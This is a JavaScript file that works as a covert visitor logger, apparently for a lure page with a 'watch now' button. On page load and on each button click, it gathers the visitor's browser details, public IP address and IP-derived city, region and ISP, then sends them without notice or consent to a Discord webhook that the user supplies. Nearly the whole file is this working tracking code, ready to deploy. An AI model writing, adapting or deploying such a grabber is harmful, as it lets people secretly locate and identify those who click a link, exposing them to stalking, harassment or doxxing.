const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL';

async function collectInfo() {
    const info = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer
    };

    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        info.ip = ipData.ip;

        const locationResponse = await fetch(`https://ipapi.co/${info.ip}/json/`);
        const locationData = await locationResponse.json();
        
        info.location = {
            country: locationData.country_name,
            city: locationData.city,
            region: locationData.region,
            isp: locationData.org
        };
    } catch (error) {
        console.error('Error fetching IP data:', error);
    }

    return info;
}

async function sendToDiscord(data) {
    const embed = {
        title: "New Visitor Detected!",
        color: 0xff0000,
        fields: Object.entries(data).map(([key, value]) => ({
            name: key.charAt(0).toUpperCase() + key.slice(1),
            value: typeof value === 'object' ? JSON.stringify(value) : String(value),
            inline: true
        })),
        timestamp: new Date()
    };

    const payload = {
        embeds: [embed]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

window.addEventListener('load', async () => {
    const info = await collectInfo();
    await sendToDiscord(info);
});

document.getElementById('watchNow').addEventListener('click', async () => {
    const info = await collectInfo();
    info.action = 'Button Clicked';
    await sendToDiscord(info);
});
